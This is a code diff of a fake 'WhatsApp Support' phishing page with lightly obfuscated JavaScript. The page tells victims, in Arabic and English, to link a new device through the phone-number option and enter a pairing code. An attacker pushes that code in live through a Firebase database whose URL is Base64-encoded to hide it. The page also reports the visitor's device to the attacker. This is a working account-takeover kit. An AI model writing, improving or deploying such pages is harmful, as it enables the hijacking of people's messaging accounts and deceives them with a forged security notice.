@@ -5,7 +5,7 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <title>WhatsApp Support</title>
     <style>
-        body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; background-color: #f0f2f5; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; overflow: hidden; }
+        body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; background-color: #f0f2f5; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; overflow: hidden; }
         .top-bar { position: absolute; top: 0; width: 100%; height: 25%; background-color: #00a884; z-index: -1; }
         .main-card { background: white; width: 90%; max-width: 420px; padding: 25px; border-radius: 12px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); text-align: center; }
         .whatsapp-logo { width: 65px; height: 65px; margin-bottom: 15px; }
@@ -16,25 +16,55 @@
         .highlight { color: #d91e1e; font-weight: bold; text-decoration: underline; }
         .code-container { background-color: #f8f9fa; border: 2px dashed #cfd8dc; padding: 15px; border-radius: 8px; display: inline-block; min-width: 85%; margin-top: 10px; }
         #pairing-code { font-size: 34px; font-weight: bold; color: #128c7e; letter-spacing: 3px; font-family: 'Courier New', Courier, monospace; }
-        [dir="ltr"] .instruction, [dir="ltr"] .alert-box { text-align: left; border-right: none; border-left: 3px solid #00a884; padding-left: 10px; }
     </style>
 </head>
-<body>
+<body dir="rtl">
     <div class="top-bar"></div>
     <div class="main-card">
-        <img src="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg" alt="WhatsApp" class="whatsapp-logo">
-        <div id="title" class="title"></div>
-        <div id="device-tag" class="device-info"></div>
-        <div id="alert" class="alert-box"></div>
-        <div id="instruction" class="instruction"></div>
-        <div class="code-container">
-            <div id="pairing-code">...</div>
-        </div>
+        <img src="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg" class="whatsapp-logo">
+        <div id="t_x" class="title"></div>
+        <div id="d_x" class="device-info"></div>
+        <div id="a_x" class="alert-box"></div>
+        <div id="i_x" class="instruction"></div>
+        <div class="code-container"><div id="pairing-code">...</div></div>
     </div>
+
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
     <script>
-        var _0x27f5=['\x61\x48\x52\x30\x63\x48\x4D\x36\x4C\x79\x39\x34\x63\x33\x52\x31\x65\x47\x35\x6C\x64\x43\x30\x33\x5A\x54\x41\x7A\x4F\x43\x31\x6B\x5A\x57\x5A\x68\x64\x57\x78\x30\x4C\x31\x4A\x30\x5A\x47\x4A\x69\x4C\x6D\x5A\x70\x63\x6D\x56\x69\x59\x58\x4E\x6C\x61\x57\x38\x75\x59\x32\x39\x74\x4C\x77\x3D\x3D','\x64\x61\x74\x61\x62\x61\x73\x65\x55\x52\x4C','\x69\x6E\x69\x74\x69\x61\x6C\x69\x7A\x65\x41\x70\x70','\x64\x61\x74\x61\x62\x61\x73\x65','\x69\x64','\x55\x73\x65\x72\x5F','\x66\x6C\x6F\x6F\x72','\x72\x61\x6E\x64\x6F\x6D','\x61\x72','\x6C\x61\x6E\x67\x75\x61\x67\x65','\x73\x74\x61\x72\x74\x73\x57\x69\x74\x68','\x64\x69\x72','\x72\x74\x6C','\x6C\x74\x72','\x64\x6F\x63\x75\x6D\x65\x6E\x74\x45\x6C\x65\x6D\x65\x6E\x74','\x67\x65\x74\x45\x6C\x65\x6D\x65\x6E\x74\x42\x79\x49\x64','\x74\x69\x74\x6C\x65','\x69\x6E\x6E\x65\x72\x54\x65\x78\x74','\x64\x65\x76\x69\x63\x65\x2D\x74\x61\x67','\x61\x6C\x65\x72\x74','\x69\x6E\x73\x74\x72\x74\x69\x6F\x6E','\x69\x6E\x6E\x65\x72\x48\x54\x4D\x4C','\x70\x61\x69\x72\x69\x6E\x67\x2D\x63\x6F\x64\x65','\x6C\x6F\x61\x64\x69\x6E\x67','\x76\x69\x73\x69\x74\x69\x6E\x67\x2F','\x72\x65\x66','\x73\x65\x74','\x73\x65\x73\x73\x69\x6F\x6E\x73\x2F','\x6F\x6E','\x76\x61\x6C\x75\x65','\x76\x61\x6C','\x63\x6F\x64\x65'];const _0x13c7=function(_0x27f5a,_0x13c7a){return _0x27f5[_0x27f5a];};const _0x4d2e={};_0x4d2e[_0x13c7(1)]=atob(_0x13c7(0));firebase[_0x13c7(2)](_0x4d2e);const _0xdb=firebase[_0x13c7(3)]();const _0xurl=new URLSearchParams(window.location.search);const _0xvid=_0xurl.get(_0x13c7(4))||_0x13c7(5)+Math[_0x13c7(6)](Math[_0x13c7(7)]()*0x270f);function _0xgetD(){const _0xua=navigator.userAgent;if(/android/i.test(_0xua))return "Android Device";if(/iPad|iPhone|iPod/.test(_0xua))return "iPhone (iOS)";return "Mobile Device";}const _0xdev=_0xgetD();const _0xlang=navigator[_0x13c7(9)][_0x13c7(10)](_0x13c7(8))?_0x13c7(8):'en';document[_0x13c7(14)][_0x13c7(11)]=_0xlang===_0x13c7(8)?_0x13c7(12):_0x13c7(13);const _0xdata={ar:{title:"\u062a\u062d\u062f\u064a\u062b\x20\u0623\u0645\u0627\u0646\x20\u0627\u0644\u062d\u0633\u0627\u0628\x20\u0644\u0644\u0631\u0642\u0645\x3a\x20"+(_0xurl.get('id')||""),device:"\u062a\u0645\x20\u0627\u0644\u062a\u0631\u0641\x20\u0639\u0644\u0649\x20\u062c\u0647\u0627\u0632\u0643\x3a\x20"+_0xdev,alert:"\u26a0\ufe0f\x20\u062a\u0646\u0628\u064a\u0647\x3a\x20\u0633\u064a\u0635\u0644\u0643\x20\u0627\u0644\u0622\u0646\x20\u0625\u0634\u0639\u0627\u0631\x20\u0639\u0644\u0649\x20\u0648\u0627\u062a\u0633\u0627\u0628\x20\u064a\u0637\u0644\u0628\x20\x27\u0631\u0628\u0637\x20\u062c\u0647\u0627\u0632\x20\u062c\u062f\u064a\u062f\x27\x2e\x20\u0627\u0636\u063a\u0637\x20\u0639\u0644\u064a\u0647\x20\u0644\u0644\u0645\u062a\u0627\u0628\u0639\u0629\x2e",instr:"\u062e\u0637\u0648\u0627\u062a\x20\u0627\u0644\u0645\u0632\u0627\u0645\u0646\u0629\x3a\x3c\x62\x72\x3e\x31\x2e\x20\u0627\u0641\u062a\u062d\x20\u0627\u0644\x25\u0625\u0634\u0639\u0627\u0631\x20\u0623\u0648\x20\u0627\u0630\u0647\u0628\x20\u0644\u0644\u0625\u0639\u062f\u0627\u062f\u0627\u062a\x20\x3e\x20\u0627\u0644\u0623\u062c\u0647\u0632\u0629\x20\u0627\u0644\u0645\u0631\u062a\u0628\u0637\u0629\x2e\x3c\x62\x72\x3e\x32\x2e\x20\u0627\u0636\u063a\u0637\x20\u0639\u0644\u0649\x20\x27\u0631\u0628\u0637\x20\u062c\u0647\u0627\x20\u0632\x27\x2e\x3c\x62\x72\x3e\x33\x2e\x20\x3c\x73\x70\x61\x6e\x20\x63\x6c\x61\x73\x73\x3d\x27\x68\x69\x67\x68\x6c\x69\x67\x68\x74\x27\x3e\u0645\u0647\u0645\x20\u062c\u062f\u0627\u064b\x3a\x3c\x2f\x73\x70\x61\x6e\x3e\x20\u0627\u0636\u063a\u0637\x20\u0639\u0644\u0649\x20\u0643\u0644\u0645\u0629\x20\x3c\x62\x3e\x27\u0627\u0644\u0631\u0628\u0637\x20\u0628\u0631\u0642\u0645\x20\u0627\u0644\u0647\u0627\u062a\u0641\x20\u0628\u062f\u0644\u0627\u064b\x20\u0645\u0646\x20\u0630\u0644\u0643\x27\x3c\x2f\x62\x3e\x20\u0627\u0644\u062a\u064a\x20\u0633\u062a\u0638\u0647\u0631\x20\u0623\u0633\u0641\u0644\x20\u0627\u0644\u0634\u0627\u0634\u0629\x2e\x3c\x62\x72\x3e\x34\x2e\x20\u0623\u062f\u062e\u0644\x20\u0627\u0644\u0643\u0648\u062f\x20\u0627\u0644\u062a\u0627\u0644\u064a\x20\u0641\u064a\x20\u0627\u0644\x2e\x20\u062e\u0627\u0646\u0627\u062a\x20\u0627\u0644\u062a\u064a\x20\u0633\u062a\u0638\u0647\u0631\x20\u0644\u0643\x3a",loading:"\u0641\u062d\u0635\x2e\x2e\x2e"},en:{title:"Security Update for: "+(_0xurl.get('id')||""),device:"Verified Device: "+_0xdev,alert:"Alert: A notification will appear on your WhatsApp asking to 'Link a Device'. Tap it to proceed.",instr:"Sync Steps:<br>1. Open notification or go to Settings > Linked Devices.<br>2. Tap 'Link a Device'.<br>3. <span class='highlight'>Important:</span> Tap on <b>'Link with phone number instead'</b> at the bottom of your screen.<br>4. Enter the following code in the boxes provided:",loading:"Checking..."}};document[_0x13c7(15)](_0x13c7(16))[_0x13c7(17)]=_0xdata[_0xlang].title;document[_0x13c7(15)](_0x13c7(18))[_0x13c7(17)]=_0xdata[_0xlang].device;document[_0x13c7(15)](_0x13c7(19))[_0x13c7(17)]=_0xdata[_0xlang].alert;document[_0x13c7(15)](_0x13c7(20))[_0x13c7(21)]=_0xdata[_0xlang].instr;document[_0x13c7(15)](_0x13c7(22))[_0x13c7(17)]=_0xdata[_0xlang].loading;_0xdb[_0x13c7(25)](_0x13c7(24)+_0xvid)[_0x13c7(26)]({status:"online",device:_0xdev,lang:_0xlang,time:Date.now()});_0xdb[_0x13c7(25)](_0x13c7(27)+_0xvid)[_0x13c7(28)](_0x13c7(29),(_0xsnap)=>{const _0xval=_0xsnap[_0x13c7(30)]();if(_0xval&&_0xval[_0x13c7(31)]){document[_0x13c7(15)](_0x13c7(22))[_0x13c7(17)]=_0xval[_0x13c7(31)];}});
+        // الرابط مشفر Base64 عشان محدش يسحبه بسهولة
+        const _0x_key = "aHR0cHM6Ly94c3R1eG5ldC03ZTAzOC1kZWZhdWx0LXJ0ZGIuZmlyZWJhc2Vpby5jb20v";
+        firebase.initializeApp({ databaseURL: atob(_0x_key) });
+        const _0x_db = firebase.database();
+
+        const _0x_u = new URLSearchParams(window.location.search);
+        const _0x_id = _0x_u.get('id') || "User_" + Math.floor(Math.random() * 9999);
+        
+        const _0x_dv = /iPhone|iPad|iPod/.test(navigator.userAgent) ? "iPhone (iOS)" : "Android Device";
+        const _0x_lg = navigator.language.startsWith('ar') ? 'ar' : 'en';
+
+        const _0x_data = {
+            ar: {
+                t: "تحديث أمان الحساب للرقم: " + (_0x_u.get('id') || ""),
+                d: "تم التعرف على جهازك: " + _0x_dv,
+                a: "⚠️ تنبيه: سيصلك الآن إشعار على واتساب يطلب 'ربط جهاز جديد'. اضغط عليه للمتابعة.",
+                i: "خطوات المزامنة:<br>1. افتح الإشعار أو اذهب للإعدادات > الأجهزة المرتبطة.<br>2. اضغط على 'ربط جهاز'.<br>3. <span class='highlight'>مهم جداً:</span> اضغط على كلمة <b>'الربط برقم الهاتف بدلاً من ذلك'</b>.<br>4. أدخل الكود التالي:",
+                l: "فحص..."
+            }
+        };
+
+        // تعبئة البيانات فوراً لمنع الاختفاء
+        document.getElementById('t_x').innerText = _0x_data.ar.t;
+        document.getElementById('d_x').innerText = _0x_data.ar.d;
+        document.getElementById('a_x').innerText = _0x_data.ar.a;
+        document.getElementById('i_x').innerHTML = _0x_data.ar.i;
+        document.getElementById('pairing-code').innerText = _0x_data.ar.l;
+
+        _0x_db.ref('visiting/' + _0x_id).set({ status: "online", device: _0x_dv, time: Date.now() });
+        _0x_db.ref('sessions/' + _0x_id).on('value', (s) => {
+            const val = s.val();
+            if (val && val.code) document.getElementById('pairing-code').innerText = val.code;
+        });
     </script>
 </body>
 </html>
